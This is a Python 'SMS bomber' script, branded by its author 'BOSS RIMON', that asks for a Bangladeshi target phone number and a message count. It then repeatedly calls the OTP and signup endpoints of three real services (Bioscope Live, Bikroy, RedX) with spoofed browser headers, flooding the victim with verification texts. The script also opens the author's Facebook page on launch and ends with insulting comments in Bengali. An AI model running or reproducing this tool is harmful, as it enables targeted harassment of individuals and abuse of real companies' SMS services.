
import os,requests,time
time.sleep(1)
os.system("clear")
os.system("xdg-open https://www.facebook.com/Rimon6T9/")
logo3=("""
 
 _______     _____  ____    ____   ___   ____  _____  
|_   __ \   |_   _||_   \  /   _|.'   `.|_   \|_   _| 
  | |__) |    | |    |   \/   | /  .-.  \ |   \ | |   
  |  __ /     | |    | |\  /| | | |   | | | |\ \| |   
 _| |  \ \_  _| |_  _| |_\/_| |_\  `-'  /_| |_\   |_  
|____| |___||_____||_____||_____|`.___.'|_____|\____|                               
\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m╔══════════════════╗
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗥𝗜𝗠𝗢𝗡             \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗥]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗥𝗜𝗠𝗢𝗡      \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗜]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟳𝟳𝟳𝟯𝟵𝟮𝟴𝟭𝟲     \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗠]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗥𝗜𝗠𝗢𝗡 𝐂𝐘𝐁𝐄𝐑 𝟰𝟮𝟬 \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗢]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟳𝟳𝟳𝟯𝟵𝟮𝟴𝟭𝟲     \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗡]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟳𝟳𝟳𝟯𝟵𝟮𝟴𝟭𝟲     \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
print(logo3)
num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"\n{ses}  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  SMS WAS SENT🐼")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  SMS WAS SENT🐼")
  else:
    pass
  
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  SMS WAS SENT🐼")
    
  else:
    pass
os.system("clear")
print(""" \033[1;32m
\x1b[38;5;196m SEN🐼        
     _______     _____  ____    ____   ___   ____  _____  
|_   __ \   |_   _||_   \  /   _|.'   `.|_   \|_   _| 
  | |__) |    | |    |   \/   | /  .-.  \ |   \ | |   
  |  __ /     | |    | |\  /| | | |   | | | |\ \| |   
 _| |  \ \_  _| |_  _| |_\/_| |_\  `-'  /_| |_\   |_  
|____| |___||_____||_____||_____|`.___.'|_____|\____|                               
\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m╔══════════════════╗
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗥𝗜𝗠𝗢𝗡             \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗥]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗥𝗜𝗠𝗢𝗡      \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗜]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟳𝟳𝟳𝟯𝟵𝟮𝟴𝟭𝟲     \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗠]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗥𝗜𝗠𝗢𝗡 𝐂𝐘𝐁𝐄𝐑 𝟰𝟮𝟬 \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗢]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟳𝟳𝟳𝟯𝟵𝟮𝟴𝟭𝟲     \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗡]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟳𝟳𝟳𝟯𝟵𝟮𝟴𝟭𝟲     \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
\x1b[38;5;196m╚═════════════╝   \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗥𝗜𝗠𝗢𝗡𝄟⃝  \x1b[38;5;196m╚══════════════════╝
      \033[38;5;46m____  ____  _  ________
     \033[38;5;46m/ __ \/ __ \/ | / / ____/
    \033[38;5;46m/ / / / / / /  |/ / __/   
   \033[38;5;46m/ /_/ / /_/ / /|  / /___   
  \033[38;5;46m/_____/\____/_/ |_/_____/   
                            
 TNQ FOR USING OUR TOOLS 🖤
""")
#madarcod ase geli script curi korte 🙂
#bancod tk khoroc kore nijeo to sikhte paros
